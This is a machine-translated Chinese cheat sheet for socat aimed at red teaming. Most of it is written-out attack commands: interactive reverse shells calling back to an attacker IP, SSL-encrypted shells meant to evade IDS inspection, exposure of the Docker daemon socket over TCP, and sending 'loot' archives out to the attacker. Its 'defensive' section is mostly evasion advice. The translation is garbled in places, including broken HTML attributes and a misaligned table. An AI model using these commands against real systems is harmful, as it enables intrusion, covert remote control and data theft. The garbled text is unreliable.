<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="利用与贝壳">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="协议">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="许可证 GPLv2">
</p>

<p对齐=“中心”>
  <b>🌐建立两个双向字节流，在文件、管道、设备、套接字和SSL隧道之间传输数据</b>
</p>

---

## 📋 目录

- [概述和 Socat 架构](#-overview--the-socat-architecture)
- [Socat 与 Netcat 比较](#-socat-vs-netcat-comparison)
- [安装](#-安装)
- [完全交互式 TTY 反向 Shell](#-complete-interactive-tty-reverse-shells)
  - [攻击者侦听器 (RAW TTY)](#attacker-listener-raw-tty)
  - [目标有效负载（Pty Spawn）](#target-payload-pty-spawn)
  - [Windows 目标反向 Shell](#windows-target-reverse-shell)
- [通过 SSL/TLS 的加密反向 Shell](#-encrypted-reverse-shells-via-ssltls)
  - [生成证书](#generate-certificates)
  - [加密侦听器和连接](#encrypted-listener--connection)
- [端口转发和网络中继](#-port-forwarding--network-relays)
  - [本地端口转发](#local-port-forwarding)
  - [分叉监听器（多客户端）](#forking-listener-multi-client)
  - [UNIX 域套接字到 TCP 中继（Docker 转发）](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [使用 Socat 进行文件传输](#-file-transfers-with-socat)
- [快速参考表](#-quick-reference-table)
- [防御考虑因素和 OPSEC](#-defective-considerations--opsec)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和 Socat 架构

**Socat** (SOcket CAT) 是一个基于命令行的实用程序，它建立两个双向字节流并在它们之间传输数据。由于流可以由大量地址类型（文件、管道、设备、TCP/UDP 套接字、SSL、原始 IP、SOCKS4、UNIX 域套接字）构建，因此 Socat 通常被描述为 Netcat。

在渗透测试和红队方面，Socat 具有两大核心超能力：
1. **即时完全交互式 TTY 反向 Shell：** 生成真正的伪终端 (`pty`)，具有作业控制、箭头键和自动完成功能，无需 Python 或 `stty raw -echo` 体操。
2. **加密 SSL/TLS 网络隧道：** 通过 SSL 加密明文有效负载来绕过标准 IDS 检查。

---

## ⚖️ Socat 与 Netcat 比较

|特色 |网猫 (`nc`) | Nmap `ncat` | Nmap `ncat` |索卡特 (`socat`) |
|--------|-------------|-------------|-----------------|
| **原生 PTY Shell 生成** | ❌ 否 | ❌ 否 | ✅ 原生 (`pty,stderr,setsid`) |
| **SSL / TLS 加密** | ❌ 否 | ✅ 是 (`--ssl`) | ✅ 原生（`OPENSSL-LISTEN`、`OPENSSL`）|
| **分叉多客户端中继**| ❌ 否 | ❌ 否 | ✅ 原生 (`fork,reuseaddr`) |
| **UNIX 域套接字** | ❌ 否 | ✅ 限量 | ✅ 原生（`UNIX-LISTEN`、`UNIX-CONNECT`）|
| **二进制文件大小** |最小 (~40 KB) |中等（~500 KB）|中等（~400 KB 独立）|
| **命令语法** |简单标志 (`-lvnp`) |基于标志（`-lvnp`）|流语法（`<type>:<args>`）|

---

## 📥 安装
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Fully Interactive TTY Reverse Shells

当您使用标准 Netcat 捕获反向 shell 时，您会收到不稳定的哑 shell。 Socat 可实现 100% 稳定、完全交互式的伪终端，具有 Tab 补全、Ctrl+C 处理和屏幕编辑器支持（`vim`、`nano`）。

### Attacker Listener (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!注意]
> `file:`tty`,raw,echo=0` 将本地终端置于原始模式并禁用字符回显。如果连接意外关闭并且您的终端无响应，请键入 `reset` 并按 Enter。

### 目标有效负载（Pty Spawn）
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### 选项细分：
- `pty`：在目标系统上分配伪终端。
- `stderr`：将标准错误重定向到套接字。
- `setsid`：在新会话组中运行进程（防止父进程退出时被终止）。
- `sigint`：将中断信号 (Ctrl+C) 传递到远程进程而不是终止会话。
- `sane`：将终端控制设置重置为标准默认值。

### Windows 目标反向 Shell
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 通过 SSL/TLS 加密反向 Shell

通过使用临时 SSL/TLS 证书加密流量，防止网络安全监控 (NSM)、Zeek 和 Snort 检查您的反向 shell 负载。

### 生成证书
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### 加密监听器和连接
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 端口转发和网络中继

Socat 可以将传入流量从一个网络接口或端口直接转发到不同的远程目标。

### 本地端口转发
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### 分叉监听器（多客户端）

`fork` 选项使 Socat 能够为每个新的入站连接生成一个子进程，从而保持主侦听器打开：
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### UNIX 域套接字到 TCP 中继（Docker 转发）

当在没有网络 root 权限的情况下访问本地 Docker 守护进程套接字 (`/var/run/docker.sock`) 时：
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 使用 Socat 进行文件传输
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*（`-u`标志指定从第一个地址到第二个地址的单向模式）。*

---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **交互式 TTY 监听器** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **交互式 TTY 有效负载** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **加密 SSL 侦听器** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **加密的 SSL 有效负载** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **端口转发（中继）** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **暴露 UNIX 套接字** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **文件传输（接收器）** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **文件传输（发送者）** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>`|

---

## 🛡️ 防御考虑和 OPSEC

1. **流量加密：** 明文 TCP 反向 shell 向 IDS/IPS 公开命令。在红队交战期间始终使用 `OPENSSL-LISTEN` 和 `OPENSSL`。
2. **进程监控：** Sysmon / EDR 平台将调用 `pty,stderr,setsid` 的命令标记为立即反向 shell 启发式。
3. **独立二进制文件：** 在目标系统上部署时，使用静态编译的独立 Socat 二进制文件以避免共享库依赖。

---

## ⚠️ 法律免责声明

> [!警告]
> 本备忘单仅适用于授权的渗透测试、安全评估和学术研究。未经授权访问计算机系统和篡改网络是严格违法的。